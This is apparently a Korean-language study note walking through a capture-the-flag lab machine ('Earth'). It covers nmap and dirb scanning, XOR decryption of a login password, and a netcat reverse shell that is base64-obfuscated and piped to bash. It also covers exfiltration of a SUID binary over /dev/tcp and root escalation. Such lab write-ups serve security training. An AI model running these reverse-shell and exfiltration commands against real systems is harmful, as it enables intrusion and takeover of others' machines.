## 정보수집
---
### Scaning
- <공격대상의 IP를 찾는 방법_1> `netdiscover -r 192.168.56.0/24`
  `-r`: 대역 옵션
- <공격대상의 IP를 찾는 방법_2> `nmap 192.168.56.0/24`
  ![[Pasted image 20240925151310.png]]
  - 스캔 결과로 출력된 값들 중 원하는 공격 대상 지정
    (간단하게 mac주소를 기준으로 지정)
    ![[Pasted image 20240925151423.png]]
	- "공격 대상의 IP: 192.168.56.103"로 지정
	- ping으로 통신이 원활한지 점검
nmap을 활용한 더 자세한 scaning	
	`-sV`: 
	`-v`: 자세한 내용 출력
	`-p`: 포트 지정 (-p 80)
	`-p-`: 포트 활성화 여부 확인
- `nmap 192.168.56.103 -sV -v -p-`
  ![[Pasted image 20240925152403.png]]
  - 무엇으로 점검했는지 서비스 중인 포트는 무엇인지 서비스의 버전은 얼마인지 알 수 있다.
- 알아낸 정보를 바탕으로 서버에 접속한다.(http/https 서비스를 활용해 접근)  ![[Pasted image 20240925152735.png]]
  (ssh 접속도 가능하다)![[Pasted image 20240925152944.png]]
  "22/80/443 port 및 서비스 활성화 확인"-> IP 별 소득은 없음

`dirb http://192.168.56.103`
- 웹 페이지에 생성될 가능성이 있는 모든 디렉토리 이름 대입하여 결과 출력
  ![[Pasted image 20240925153425.png]]
  - 권한 문제로 접속이 불가능한 것을 확인(결과는 https 도 같았다)
    ![[Pasted image 20240925153513.png]]
- 웹 페이지에서 상세정보 보기를 통해 추가 정보를 획득![[Pasted image 20240925153947.png]]
  https > certification
  - earth.local / terratest.earth.local 서버의 도메인을 찾았다.
    (하지만 두 도메인으로 접속 불가, DNS가 없기 때문)
    - ![[Pasted image 20240925154616.png]]
      호스트 등록

서비스를 사용해 본다.![[Pasted image 20240925154952.png]]
- 키를 주지 않고 메시지를 보내는 것은 불가능![[Pasted image 20240925155027.png]]
- 키를 주자 메시지가 추가되었다.
- 내가 작성한 키로 메시지가 암호화 되었다.(서비스의 기능을 알 수 있게되었다.)

도메인 이름을 활용해 dirb 명령어 추가 실행
- `dirb http://earth.local`
  ![[Pasted image 20240925155430.png]]
- `http://earth.local/admin`으로 접속해 볼 수 있다는 것을 알게 되었다.![[Pasted image 20240925155942.png]]![[Pasted image 20240925160008.png]]
- `dirb https://terratest.earth.local/`에 새로운 파일이 확인되었다.![[Pasted image 20240925160355.png]]![[Pasted image 20240925160647.png]]![[Pasted image 20240925160706.png]]
  [[robots.txt]]
- `/testingnotes.*`가 허용된 것을 확인 접속을 시도한다.![[Pasted image 20240925161048.png]]![[Pasted image 20240925161214.png]]
- terra라는 사용자가 로그인할 때 testdata.txt파일을 활용해 로그인하고 암호화는 xor 방식이라는 것을 알게되었다.
- `https://terratest.earth.local/testdata.txt`![[Pasted image 20240925161446.png]]
- https://gchq.github.io/CyberChef/ 사이트를 활용해 복호화 시도![[Pasted image 20240925162816.png]]
  - 암호화에 사용되는 키 값 입력하고 암호화 결과물을 인풋에 입력
- `earthclimatechangebad4humans`
- 찾은 값을 활용해 로그인 시도![[Pasted image 20240925163151.png]]
- 접속을 갖게 되었다.![[Pasted image 20240925163213.png]]
- `cat /var/earth_web/user_flag.txt`에서 user flag를 획득했다.![[Pasted image 20240925163653.png]]
  `[user_flag_3353b67d6437f07ba7d34afd7d2fc27d]`
- putty로 접속하면 로그가 남으니 웹에서 작업을 지속

[[netcat]] 원격 접속을 하여 명령어를 실행할 수 있는 툴
- `nc -lvnp 4444` 칼리의 4444 포트를 열어 서버 사용자가 칼리 서버에 접속하도록 유도
  (아무 포트나 가능)
- `nc -e /bin/bash 192.168.56.102 4444`(이때 IP는 공격자 IP)![[Pasted image 20240925164333.png]]
- 위 명령어를 직접 입력해서는 접속할 수 없다. (암호화를 작업 진행)![[Pasted image 20240925165021.png]]
- 암호화된 명령어 입력
  `echo 'bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguNTYuMTAzIDQ0NDQK' | base64 -d | bash`![[Pasted image 20240925165056.png]]
- 쉘을 가져오게 되었다.![[Pasted image 20240925170242.png]]
- `find / -perm -u=s -type f 2>/dev/null` ![[Pasted image 20240925170451.png]]
- `file /usr/bin/reset_root` 실행안됨
- `nc -lvnp 3333 > reset_root` 다른쉘에서 실행하고 웹 페이지로 이동![[Pasted image 20240925170741.png]]
- `cat /usr/bin/reset_root > /dev/tcp/192.168.56.102/3333`![[Pasted image 20240925170947.png]]
```
kali
nc -lvnp 4444
cli
nc -e /bin/bash kali ip 4444 -> netcat을 통한 연결 실패
암호화 진행
kali
echo 'nc -e /bin/bash kali ip 4444' | base64 -> 암호화된 내용 복사
cli
echo '암호화된 내용' | base64 -d | bash -> 칼리에서 연결 확인

kali netcat
whoami
find / -perm -u=s -type f 2>/dev/null -> apache 사용자로 실행할 수 있는 관리자 파일 검색 -> reset_root 파일 확인
file reset_root 및 reset_root 실행 시 안됨 

kali 다른 터미널 
nc -lvnp 3333 > reset_root
cli 
cat /usr/bin/reset_root > /dev/tcp/kali ip/3333 -> 칼리에서 연결 확인(암호화해서 입력하면됨)

kali 터미널에서 reset_root 파일 존재 확인 - cat reset_root -> chmod 755 수정
ltrace ./reset_root -> 3개 파일 확인
netcat에서 3개 파일 생성
touch 경로+파일
reset_root 실행 -> 패스워드가 Earth로 변경
su root -> root로 접속
cd root
ls
root_flag.txt 확인 -> root 사용자의 flag 확인
```
![[{C3D5F161-A336-4C6D-9B32-0929D9E52BEA}.png]]![[{11163887-E97A-449B-BA64-8216940778B3}.png]]